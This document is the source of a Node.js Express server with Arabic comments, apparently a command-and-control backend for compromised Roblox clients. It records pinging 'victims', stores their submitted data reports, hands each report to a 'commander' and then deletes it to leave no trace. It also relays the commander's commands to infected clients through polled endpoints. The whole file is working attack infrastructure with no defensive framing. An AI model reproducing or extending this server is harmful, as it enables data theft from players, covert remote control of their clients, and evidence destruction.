const express = require('express');
const cors = require('cors');
const app = express();

// إعدادات الوصول العام
app.use(cors());
app.use(express.json());

// مخازن البيانات في الذاكرة
let activePlayers = {};
let chatData = { username: "System", message: "No Command", time: Date.now() };
let victimInfo = {};

// ✅ حل مشكلة CORS للمتصفحات والمحركات الخارجية
app.options('*', cors());

// ==========================================
// [1] استقبال الإشارات (Ping) من الضحايا
// ==========================================
app.post('/ping', (req, res) => {
    try {
        const { username, placeId, jobId } = req.body;
        console.log(`📡 [PING] اتصال من المستخدم: ${username}`);
        
        if (username) {
            activePlayers[username] = {
                placeId: placeId,
                jobId: jobId,
                lastSeen: Date.now()
            };
        }
        res.json({ status: "updated", serverTime: Date.now() });
    } catch (error) {
        console.error("❌ خطأ في استقبال الـ Ping:", error);
        res.status(500).json({ error: "Internal server error" });
    }
});

// ==========================================
// [2] استقبال تقارير النظام الكاملة (Info)
// ==========================================
app.post('/info', (req, res) => {
    try {
        const { username, data } = req.body;
        console.log(`📊 [INFO] تقرير استخباراتي جديد استُلم من: ${username}`);
        
        if (username && data) {
            // تخزين البيانات مع إضافة طابع زمني للسيرفر
            victimInfo[username] = {
                ...data,
                receivedAt: Date.now(),
                timestamp: new Date().toLocaleString()
            };
            console.log(`✅ [SUCCESS] تم حفظ معلومات الضحية: ${username} بنجاح`);
            res.json({ status: "success", message: "Report stored on server memory" });
        } else {
            console.log("⚠️ [WARN] محاولة إرسال بيانات ناقصة في مسار /info");
            res.status(400).json({ status: "error", message: "Missing username or data payload" });
        }
    } catch (error) {
        console.error("❌ خطأ فادح في معالجة البيانات المستلمة:", error);
        res.status(500).json({ status: "error", message: "Internal server error while processing info" });
    }
});

// ==========================================
// [3] جلب المعلومات للقائد (GetInfo) + تنظيف
// ==========================================
app.get('/getinfo', (req, res) => {
    try {
        const username = req.query.username;
        console.log(`🔍 [QUERY] القائد يطلب فحص بيانات: ${username}`);
        
        if (!username) {
            return res.status(400).json({ 
                status: "error", 
                message: "اسم المستخدم مطلوب للبحث" 
            });
        }
        
        const info = victimInfo[username];
        
        if (info) {
            const now = Date.now();
            const timeDiff = now - info.receivedAt;
            
            console.log(`📤 [DATA] إرسال بيانات ${username} للقائد...`);
            
            // إرسال البيانات للقائد
            res.json({
                status: "success",
                data: info,
                ageInSeconds: Math.floor(timeDiff / 1000)
            });

            // 🔥 التنظيف: الحذف فوراً بعد القراءة لضمان عدم بقاء الأثر
            delete victimInfo[username];
            console.log(`🗑️ [CLEANUP] تم مسح بيانات ${username} من الذاكرة لضمان السرية.`);
            
        } else {
            console.log(`❌ [NOT FOUND] لا توجد بيانات مخزنة حالياً للمستخدم: ${username}`);
            res.status(404).json({ 
                status: "not_found", 
                message: "لم يتم العثور على تقارير لهذا المستخدم" 
            });
        }
    } catch (error) {
        console.error("❌ خطأ في استرجاع البيانات:", error);
        res.status(500).json({ status: "error", message: "Internal server error" });
    }
});

// ==========================================
// [4] قائمة اللاعبين النشطين (Active Players)
// ==========================================
app.get('/players', (req, res) => {
    try {
        const now = Date.now();
        // تصفية اللاعبين الذين لم يرسلوا Ping منذ أكثر من 20 ثانية
        const onlineList = Object.keys(activePlayers)
            .filter(user => (now - activePlayers[user].lastSeen) < 20000)
            .sort();
        
        console.log(`👥 [STATUS] عدد اللاعبين المتصلين حالياً: ${onlineList.length}`);
        res.json(onlineList);
    } catch (error) {
        console.error("❌ خطأ في جلب قائمة اللاعبين:", error);
        res.status(500).json([]);
    }
});

// ==========================================
// [5] تحديث الأوامر (Commander Commands)
// ==========================================
app.post('/update', (req, res) => {
    try {
        const { username, message } = req.body;
        if (username && message) {
            chatData = { 
                username: username, 
                message: message, 
                time: Date.now() 
            };
            console.log(`👑 [COMMAND] أمر جديد من القائد ${username}: ${message}`);
            res.json({ status: "command_sent", timestamp: chatData.time });
        } else {
            res.status(400).json({ error: "Invalid command format" });
        }
    } catch (error) {
        console.error("❌ خطأ في تحديث الأوامر:", error);
        res.status(500).json({ error: "Internal server error" });
    }
});

// ==========================================
// [6] جلب الأوامر واستطلاع الحالة
// ==========================================
app.get('/data', (req, res) => res.json(chatData));

app.get('/test', (req, res) => {
    res.json({
        status: "online",
        database_status: "ready",
        active_victims: Object.keys(activePlayers).length,
        pending_reports: Object.keys(victimInfo).length,
        server_uptime: process.uptime()
    });
});

// تشغيل السيرفر
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n==========================================`);
    console.log(`🚀 704_TM CONTROL SERVER IS LIVE`);
    console.log(`📡 Listening on Port: ${PORT}`);
    console.log(`📅 Started: ${new Date().toLocaleString()}`);
    console.log(`==========================================\n`);
});
